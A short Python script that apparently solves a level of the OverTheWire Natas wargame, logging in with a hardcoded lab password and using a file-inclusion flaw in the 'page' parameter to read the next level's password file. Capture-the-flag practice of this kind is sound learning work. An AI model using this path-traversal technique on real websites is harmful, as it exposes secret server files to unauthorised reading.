import requests

url1 = 'http://natas7.natas.labs.overthewire.org/'
url3 = 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
user = 'natas7'
passwd = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

r1 = requests.get(url1,auth=(user, passwd))
print r1.text
print '='*80
r3 = requests.get(url3,auth=(user, passwd))
print r3.text
print '='*80
a = r3.text
for i in a.splitlines():
	if " " not in i:
		print i